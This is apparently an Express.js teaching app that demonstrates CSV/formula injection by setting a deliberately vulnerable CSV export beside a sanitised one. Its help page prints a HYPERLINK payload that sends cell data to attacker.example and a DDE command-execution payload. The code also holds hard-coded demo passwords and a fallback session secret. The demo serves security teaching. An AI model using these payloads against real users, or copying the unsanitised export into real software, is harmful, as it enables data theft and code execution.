// app.js - CSV / Formula Injection demonstration
// Dependencies: express, express-session, bcryptjs
// Install: npm install express express-session bcryptjs
//
// CSV/Formula injection occurs when user-supplied data is exported to a CSV file
// without escaping formula-initiating characters. Spreadsheet applications such as
// Excel, LibreOffice Calc, and Google Sheets evaluate cell values that start with
// =, +, -, or @ as formulas. An attacker who stores a formula as their name or
// message causes it to execute when an admin opens the exported file.

const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');

const app = express();

// ---------- In-memory submissions store ----------
// Both the vulnerable and safe CSV exports are built from the same submissions.
// The difference is only in how values are serialised when writing the CSV.
const submissions = [];

// ---------- Middleware ----------
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ---------- Sessions ----------
app.use(
  session({
    name: 'sid',
    secret: process.env.SESSION_SECRET || 'change-this-session-secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      sameSite: 'lax',
      // secure: true, // enable when serving over HTTPS
      maxAge: 1000 * 60 * 60
    }
  })
);

// ---------- In-memory users for session auth ----------
const seedUsers = [
  { username: 'alice', password: 'password1', role: 'admin' },
  { username: 'bob',   password: 'password2', role: 'user'  }
];
const USERS = Object.fromEntries(
  seedUsers.map(u => [
    u.username,
    { username: u.username, role: u.role, passwordHash: bcrypt.hashSync(u.password, 10) }
  ])
);

// ---------- Helpers ----------
function requireAuth(req, res, next) {
  if (req.session?.user) return next();
  return res.status(401).send(`
    <h1>401 Unauthorized</h1>
    <p>You must <a href="/login">log in</a> to access this page.</p>
  `);
}

function requireRole(role) {
  return (req, res, next) => {
    if (req.session?.user?.role === role) return next();
    return res.status(403).send('<h1>403 Forbidden</h1><p>Insufficient permissions.</p>');
  };
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Standard CSV quoting: wrap the value in double-quotes and escape any internal
// double-quotes by doubling them. This handles commas and embedded newlines
// in values but does NOT prevent formula injection.
function csvQuote(s) {
  return `"${String(s).replace(/"/g, '""')}"`;
}

// Prevent formula injection: prefix any value whose first character is a
// formula-initiating character with a single quote. Excel and LibreOffice
// treat a leading ' as a text prefix and will not evaluate the value as a formula.
function sanitizeCsvField(s) {
  const str = String(s);
  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
}

// ---------- CSV builders ----------
function buildCsvVulnerable(rows) {
  const lines = ['Name,Email,Message,Submitted'];
  for (const r of rows) {
    // VULNERABLE: values are CSV-quoted but not sanitised against formula injection.
    // A value like =HYPERLINK("http://evil.com","Click") is written as-is and will
    // be evaluated as a formula when the file is opened in a spreadsheet application.
    lines.push([r.name, r.email, r.message, r.submitted].map(csvQuote).join(','));
  }
  return lines.join('\r\n');
}

function buildCsvSafe(rows) {
  const lines = ['Name,Email,Message,Submitted'];
  for (const r of rows) {
    // Safe: sanitizeCsvField prepends ' to any formula-initiating value before quoting.
    // The spreadsheet application reads '=HYPERLINK(...) as text, not a formula.
    lines.push(
      [r.name, r.email, r.message, r.submitted]
        .map(v => csvQuote(sanitizeCsvField(v)))
        .join(',')
    );
  }
  return lines.join('\r\n');
}

// ---------- Templates ----------
const nav = (user) => `
  <nav>
    <a href="/">Home</a> |
    <a href="/dashboard">Dashboard</a> |
    <a href="/admin">Admin</a> |
    <a href="/submit">Submit</a> |
    <a href="/submissions">Submissions (Admin)</a> |
    <a href="/login">${user ? 'Switch user' : 'Login'}</a>
    ${user ? ' | <form style="display:inline" method="post" action="/logout"><button>Logout</button></form>' : ''}
  </nav>
  <hr>
`;

const page = (title, body, user) => `
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body>
  ${nav(user)}
  ${body}
</body>
</html>
`;

// ---------- Routes ----------
app.get('/', (req, res) => {
  const user = req.session.user;
  res.send(page('CSV / Formula Injection', `
    <h1>CSV / Formula Injection</h1>
    <p>CSV/Formula injection occurs when user-supplied data is included in a CSV export without escaping formula-initiating characters. Spreadsheet applications — Excel, LibreOffice Calc, Google Sheets — evaluate any cell whose content begins with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a formula. Standard CSV quoting (wrapping values in double-quotes to handle commas and newlines) does not prevent this: <code>"=HYPERLINK(...)"</code> is still evaluated as a formula when the file is opened.</p>
    <p>This example uses a contact form where anyone can submit their name, email, and a message. An admin can export all submissions to a CSV file. The vulnerable export at <a href="/export.csv">/export.csv</a> writes values with standard CSV quoting only; the safe export at <a href="/export-safe.csv">/export-safe.csv</a> additionally prefixes formula-initiating characters with a single quote, which spreadsheet applications interpret as a text prefix rather than a formula marker. Both exports are built from the same submissions; the <a href="/submissions">/submissions</a> page (admin only) shows inline previews of both so you can compare the raw CSV text.</p>

    <h2>How This App Works</h2>
    <p>The contact form at <a href="/submit">/submit</a> accepts any input without restriction (a realistic scenario — you cannot know in advance which users will submit malicious formulas). The vulnerability is in the export, not the storage. The same stored value is exported safely or unsafely depending on whether the serialiser applies <code>sanitizeCsvField()</code> before quoting.</p>

    <h2>The Attack</h2>
    <p>Submit the following as the Name field on the <a href="/submit">/submit</a> form:</p>
    <pre>=HYPERLINK("http://attacker.example/collect?data="&amp;B2,"Click to verify account")</pre>
    <p>When an admin opens <a href="/export.csv">/export.csv</a> in Excel or LibreOffice:</p>
    <ul>
      <li>The cell displays as a clickable link labelled "Click to verify account"</li>
      <li>Clicking the link opens <code>http://attacker.example/collect?data=</code> concatenated with the content of cell B2 (the email in the next row)</li>
      <li>The attacker's server receives the email address without the admin noticing</li>
    </ul>
    <p>A more aggressive payload on older Windows Excel versions:</p>
    <pre>=cmd|' /C calc'!A0</pre>
    <p>This uses DDE (Dynamic Data Exchange) to execute an arbitrary command — <code>calc.exe</code> in this case — when the file is opened.</p>

    <h2>Try It</h2>
    <ul>
      <li>Visit <a href="/submit">/submit</a> — enter a formula as the Name field</li>
      <li>Log in as <code>alice / password1</code> (admin), then visit <a href="/submissions">/submissions</a></li>
      <li>Compare the vulnerable and safe CSV previews — the vulnerable one contains the raw formula; the safe one prefixes it with <code>'</code></li>
      <li>Download <a href="/export.csv">/export.csv</a> and open it in Excel or LibreOffice to see the formula execute</li>
      <li>Download <a href="/export-safe.csv">/export-safe.csv</a> and open it — the cell shows <code>'=HYPERLINK...</code> as literal text</li>
    </ul>

    ${user ? `<p>Currently logged in as <strong>${user.username}</strong> (${user.role}).</p>` : '<p>You are not logged in.</p>'}
  `, user));
});

app.get('/login', (req, res) => {
  const user = req.session.user;
  res.send(page('Login', `
    <h1>Login</h1>
    <form method="post" action="/login">
      <label for="username">Username</label><br>
      <input id="username" name="username" autocomplete="username" required><br><br>
      <label for="password">Password</label><br>
      <input id="password" name="password" type="password" autocomplete="current-password" required><br><br>
      <button type="submit">Sign in</button>
    </form>
    ${user ? `<p>Already logged in as <strong>${user.username}</strong>. <a href="/">Go home</a>.</p>` : ''}
  `, user));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  const record = USERS[username];
  if (!record || !bcrypt.compareSync(password, record.passwordHash)) {
    return res.status(401).send(page('Login failed', '<p>Invalid credentials.</p><p><a href="/login">Try again</a></p>'));
  }
  req.session.user = { username: record.username, role: record.role };
  res.redirect('/dashboard');
});

app.post('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/'));
});

app.get('/dashboard', requireAuth, (req, res) => {
  const user = req.session.user;
  res.send(page('Dashboard', `
    <h1>Dashboard</h1>
    <p>Welcome, <strong>${user.username}</strong>. Your role is <strong>${user.role}</strong>.</p>
    ${user.role === 'admin'
      ? '<p><a href="/submissions">View submissions</a> | <a href="/export.csv">Download vulnerable CSV</a> | <a href="/export-safe.csv">Download safe CSV</a></p>'
      : '<p><a href="/submit">Submit a contact form</a></p>'}
  `, user));
});

app.get('/admin', requireAuth, requireRole('admin'), (req, res) => {
  const user = req.session.user;
  res.send(page('Admin', `
    <h1>Admin</h1>
    <p>Only admins can see this. Hello, <strong>${user.username}</strong>.</p>
    <p><a href="/submissions">View submissions</a></p>
  `, user));
});

app.get('/api/me', requireAuth, (req, res) => {
  res.json({ user: req.session.user, ok: true });
});

// ---------- Submit form (public) ----------
const submitForm = (error, user) => page('Contact Form', `
  <h1>Contact Form</h1>
  <p>Submit a message. No login required.</p>
  <form method="post" action="/submit">
    <label for="name">Name</label><br>
    <input id="name" name="name" placeholder="e.g. Alice Smith" style="width:400px" required><br><br>
    <label for="email">Email</label><br>
    <input id="email" name="email" type="email" placeholder="e.g. alice@example.com" style="width:400px" required><br><br>
    <label for="message">Message</label><br>
    <textarea id="message" name="message" rows="4" style="width:400px" required></textarea><br><br>
    <button type="submit">Submit</button>
  </form>
  ${error ? `<p style="color:red">${escapeHtml(error)}</p>` : ''}
`, user);

app.get('/submit', (req, res) => {
  res.send(submitForm('', req.session.user || null));
});

app.post('/submit', (req, res) => {
  const { name = '', email = '', message = '' } = req.body || {};
  if (!name.trim() || !email.trim() || !message.trim()) {
    return res.send(submitForm('All fields are required.', req.session.user || null));
  }
  // Submissions are stored as-is. The vulnerability is in the CSV export, not storage.
  submissions.push({ name, email, message, submitted: new Date().toISOString() });
  res.send(page('Submitted', `
    <h1>Thank you</h1>
    <p>Your message has been received.</p>
    <p><a href="/submit">Submit another</a></p>
  `, req.session.user || null));
});

// ---------- Submissions viewer (admin only) ----------
app.get('/submissions', requireAuth, requireRole('admin'), (req, res) => {
  const user = req.session.user;
  const count = submissions.length;

  const tableRows = count === 0
    ? '<tr><td colspan="4"><em>No submissions yet.</em></td></tr>'
    : submissions.map(r => `
        <tr>
          <td>${escapeHtml(r.name)}</td>
          <td>${escapeHtml(r.email)}</td>
          <td>${escapeHtml(r.message)}</td>
          <td>${escapeHtml(r.submitted)}</td>
        </tr>`).join('');

  const vulnCsv  = buildCsvVulnerable(submissions) || '(no submissions yet)';
  const safeCsv  = buildCsvSafe(submissions)       || '(no submissions yet)';

  res.send(page('Submissions', `
    <h1>Submissions (${count})</h1>
    <table border="1" cellpadding="6" cellspacing="0">
      <thead><tr><th>Name</th><th>Email</th><th>Message</th><th>Submitted</th></tr></thead>
      <tbody>${tableRows}</tbody>
    </table>

    <h2>Vulnerable CSV <small>(<a href="/export.csv" download>download</a>)</small></h2>
    <p>Values are CSV-quoted but formula-initiating characters are not escaped. Opening this file in Excel or LibreOffice evaluates any cell starting with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> as a formula.</p>
    <pre style="background:#f8f8f8;border:1px solid #ccc;padding:12px;line-height:1.6">${escapeHtml(vulnCsv)}</pre>

    <h2>Safe CSV <small>(<a href="/export-safe.csv" download>download</a>)</small></h2>
    <p>Formula-initiating characters are prefixed with <code>'</code> before CSV quoting. The spreadsheet application treats the leading <code>'</code> as a text prefix and displays the value literally.</p>
    <pre style="background:#f8f8f8;border:1px solid #ccc;padding:12px;line-height:1.6">${escapeHtml(safeCsv)}</pre>
  `, user));
});

// ---------- CSV export — vulnerable ----------
app.get('/export.csv', requireAuth, requireRole('admin'), (req, res) => {
  const csv = buildCsvVulnerable(submissions);
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="submissions.csv"');
  res.send(csv);
});

// ---------- CSV export — safe ----------
app.get('/export-safe.csv', requireAuth, requireRole('admin'), (req, res) => {
  const csv = buildCsvSafe(submissions);
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="submissions-safe.csv"');
  res.send(csv);
});

// ---------- Start ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`App running at http://localhost:${PORT}`);
});
